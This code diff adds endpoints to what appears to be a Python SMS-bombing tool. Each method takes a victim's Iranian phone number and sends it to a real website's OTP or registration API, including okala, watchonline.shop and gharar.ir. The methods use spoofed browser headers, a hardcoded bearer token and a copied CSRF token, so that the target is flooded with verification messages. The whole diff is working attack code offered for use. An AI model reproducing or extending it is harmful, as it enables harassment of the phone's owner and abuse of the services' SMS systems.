@@ -1796,7 +1796,7 @@ class sms:
             return True
         except:
             pass
-
+            
             
     def tajtehran(phone):
         n4 = f"mobile=0{phone.split('+98')[1]}&password=mamad1234"
@@ -1806,7 +1806,7 @@ class sms:
             return True
         except:
             pass
-
+            
             
     def zivanpet(phone):
         n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split('+98')[1]}&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone.split('+98')[1]}&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b"
@@ -1818,11 +1818,31 @@ class sms:
         except:
             pass
             
+            
     def okala(phone):
         n4 = {"mobile":"0"+ phone.split('+98')[1],"deviceTypeCode":0,"confirmTerms":True,"notRobot":False}
         rhead = {'user-agent': generate_user_agent(os="win")}
         try:
             post(url="https://api-react.okala.com/C/CustomerAccount/OTPRegister",json=n4, headers=rhead)
+            return True
+        except:
+            pass            
+            
+            
+    def watchonline(phone):
+        n4 = {"mobile":"0"+ phone.split('+98')[1]}
+        rhead = {'Host': 'api.watchonline.shop','Connection': 'keep-alive','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','Accept': 'application/json','Content-Type': 'application/json','Authorization': 'Bearer 7e3b55d76312e3c127758e1a5d47d27d49ea22ebf7d9ba99cb9ff3516d34900b','Origin': 'https://www.watchonline.shop','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.watchonline.shop/','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
+        try:
+            post(url="https://api.watchonline.shop/api/v1/otp/request",json=n4, headers=rhead)
+            return True
+        except:
+            pass            
+            
+    def gharar(phone):
+        n4 = f"phone=0{phone.split('+98')[1]}"
+        rhead = {'content-length': '17','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-csrftoken': 'DP6LQ9sSuEs45ZZuEh5DJJ7sIEHnW30KbVLZFDAmOnqymk6gUw4Z1e9RV1j17DhG','sec-ch-ua-platform': 'Android','origin': 'https://gharar.ir','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://gharar.ir/','accept-encoding': 'gzip, deflate, br','accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
+        try:
+            post(url="https://gharar.ir/users/phone_number/",data=n4, headers=rhead)
             return True
         except:
             pass            
